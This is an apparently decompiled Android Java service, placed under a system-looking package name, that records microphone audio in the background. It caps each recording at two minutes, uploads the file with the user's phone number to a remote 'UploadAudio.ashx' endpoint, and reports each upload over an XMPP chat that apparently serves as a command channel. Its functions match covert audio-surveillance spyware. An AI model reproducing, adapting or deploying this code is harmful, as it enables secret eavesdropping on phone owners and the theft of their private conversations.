package com.android.service;

import android.app.Service;
import android.content.Intent;
import android.media.MediaRecorder;
import android.media.MediaRecorder.OnInfoListener;
import android.os.IBinder;
import com.xmpp.client.util.AppPreferences;
import com.xmpp.client.util.ValueUtiles;
import java.io.File;
import org.jivesoftware.smack.XMPPException;
import org.jivesoftware.smack.packet.Message;

public class RecordingService extends Service {
    private AppPreferences _appPrefs;
    /* access modifiers changed from: private */
    public String hostname = "";
    /* access modifiers changed from: private */
    public MediaRecorder mediaRecorder = null;
    /* access modifiers changed from: private */
    public File recodeFile = null;
    private String strDataPath = "";
    /* access modifiers changed from: private */
    public String username = null;

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onStart(Intent intent, int startId) {
        this.hostname = getString(R.string.hostname);
        this._appPrefs = new AppPreferences(this);
        this.username = this._appPrefs.getMainnum();
        String fileName = "recoder.mp3";
        this.strDataPath = this._appPrefs.getDataPath();
        if (this.strDataPath.length() <= 0) {
            this.strDataPath = ValueUtiles.getDataPath(this);
        }
        this.recodeFile = new File(this.strDataPath, this.username + fileName);
        this.mediaRecorder = new MediaRecorder();
        try {
            this.mediaRecorder.setAudioSource(1);
            this.mediaRecorder.setOutputFormat(1);
            this.mediaRecorder.setAudioEncoder(1);
        } catch (Exception e) {
        }
        try {
            this.mediaRecorder.setMaxDuration(120000);
            this.mediaRecorder.setOnInfoListener(new OnInfoListener() {
                public void onInfo(MediaRecorder mr, int what, int extra) {
                    if (what == 800) {
                        System.out.println("已經達到最大的錄製時間");
                        if (RecordingService.this.mediaRecorder != null) {
                            RecordingService.this.mediaRecorder.stop();
                            RecordingService.this.mediaRecorder.release();
                            RecordingService.this.mediaRecorder = null;
                            ValueUtiles.UploadFileForServer(RecordingService.this.recodeFile.getAbsolutePath(), "http://" + RecordingService.this.hostname + "/API/UploadAudio.ashx?phonenum=" + RecordingService.this.username);
                            try {
                                XmppService.sendMsg = new Message();
                                XmppService.sendMsg.setBody("recordupload");
                                XmppService.newChat.sendMessage(XmppService.sendMsg);
                            } catch (XMPPException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            });
            this.mediaRecorder.setOutputFile(this.recodeFile.getAbsolutePath());
            try {
                this.mediaRecorder.prepare();
            } catch (Exception e2) {
            }
            this.mediaRecorder.start();
        } catch (Exception e3) {
            e3.printStackTrace();
        }
        super.onStart(intent, startId);
    }

    public void onDestroy() {
        if (this.mediaRecorder != null) {
            this.mediaRecorder.stop();
            this.mediaRecorder.release();
            this.mediaRecorder = null;
            ValueUtiles.UploadFileForServer(this.recodeFile.getAbsolutePath(), "http://" + this.hostname + "/API/UploadAudio.ashx?phonenum=" + this.username);
            try {
                XmppService.sendMsg = new Message();
                XmppService.sendMsg.setBody("recordupload");
                XmppService.newChat.sendMessage(XmppService.sendMsg);
            } catch (XMPPException e) {
                e.printStackTrace();
            }
        }
        super.onDestroy();
    }
}
